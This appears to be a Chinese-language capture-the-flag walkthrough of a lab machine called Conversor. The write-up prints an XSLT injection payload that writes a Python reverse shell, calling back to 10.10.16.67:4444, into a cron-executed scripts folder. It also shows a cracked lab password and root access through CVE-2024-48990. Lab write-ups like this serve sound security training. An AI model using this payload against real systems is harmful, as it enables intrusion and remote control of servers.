
<img width="1280" height="674" alt="Image" src="https://github.com/user-attachments/assets/6dc55aa1-615b-427b-9dad-ea883187d55a" />

nmap -sC -sV 10.129.2.154

两个端口 一个22，一个80

重定向到http://conversor.htb/

将conversor.htb添加到etc/hosts文件中

<img width="389" height="155" alt="Image" src="https://github.com/user-attachments/assets/56305577-2a79-4100-9acf-7c613108d283" />

<img width="317" height="255" alt="Image" src="https://github.com/user-attachments/assets/06bff4c4-0373-4e8a-9df4-9d32c2186fd7" />

浏览器访问 一个登录框，可以注册

<img width="534" height="357" alt="Image" src="https://github.com/user-attachments/assets/e8eaf768-6635-4b28-838e-00b2e53b4471" />

可以上传XML和XSLT文件
好像是可以将XML和XSLT转换为HTML

<img width="525" height="353" alt="Image" src="https://github.com/user-attachments/assets/ba273a7f-26b9-4981-aa8d-ece7be5677d3" />

dirsearch扫一下目录
得到一个about页面

<img width="411" height="224" alt="Image" src="https://github.com/user-attachments/assets/33143e50-258a-44e0-a376-8e5af204824a" />

<img width="411" height="224" alt="Image" src="https://github.com/user-attachments/assets/e8c6048f-7d36-43d8-9b72-9e6a3efd7b29" />

下载了一个什么源码之类的压缩包

tar -xvf解压一下

<img width="133" height="189" alt="Image" src="https://github.com/user-attachments/assets/fe465c03-2f96-4ec3-b586-e83b201eed2c" />

app.py

<img width="525" height="489" alt="Image" src="https://github.com/user-attachments/assets/269a16fe-42ba-41d7-80c3-fe0c453384ce" />

parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
xml_tree = etree.parse(xml_path, parser)           # 這邊相對安全
xslt_tree = etree.parse(xslt_path)                 # ← 致命！沒任何保護
transform = etree.XSLT(xslt_tree)
result_tree = transform(xml_tree)

install.md
在这里是每分钟执行一次/var/www/conversor.htb/scripts/下的任意py脚本

<img width="488" height="242" alt="Image" src="https://github.com/user-attachments/assets/c99e00c4-ba17-4331-a387-05f0b3d527b5" />

在app.py中可以文件写入，只要将shell.py写入到/var/www/conversor.htb/scripts/
过一分钟就会执行我们shell.py中的反弹shell

创建xslt文件，写入反弹shell命令

<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell">
    <xsl:template match="/">
        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.67",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
        </shell:document>
    </xsl:template>
</xsl:stylesheet>


本地监听4444端口
等待一分钟 获得www-data shell
获取交互式shell：

python3 -c 'import pty; pty.spawn("/bin/bash")'
<img width="311" height="108" alt="Image" src="https://github.com/user-attachments/assets/f12e997f-f098-4107-b183-05cc8200d66f" />

在之前app.py中还泄露了一个信息

数据库的路径

DB_PATH = '/var/www/conversor.htb/instance/users.db'

<img width="332" height="267" alt="Image" src="https://github.com/user-attachments/assets/ffd4db74-c199-4ba2-bbaf-b6f14a6ad532" />

查看一下
获得了两个hash

sqlite3 ./users.db "SELECT * FROM users;"

<img width="483" height="453" alt="Image" src="https://github.com/user-attachments/assets/dbff61d6-ef35-497d-a75b-864811760760" />

admin是我在前端创建的账号

fismathack 密码：Keepmesafeandwarm

<img width="708" height="326" alt="Image" src="https://github.com/user-attachments/assets/21b09905-d87e-4bdb-a353-544e0fa8beac" />

连接成功，获得第一个flag

<img width="557" height="473" alt="Image" src="https://github.com/user-attachments/assets/53546888-f6c3-4838-ad75-74770060b060" />

ROOT：

存在CVE-2024-48990 权限提升漏洞

<img width="557" height="126" alt="Image" src="https://github.com/user-attachments/assets/f51a16dc-1820-4575-a0b9-dff2e64e3b27" />

利用大佬的exp

<img width="630" height="398" alt="Image" src="https://github.com/user-attachments/assets/539b8658-a9de-4313-a1a9-e477e4f40d72" />

拿到root权限
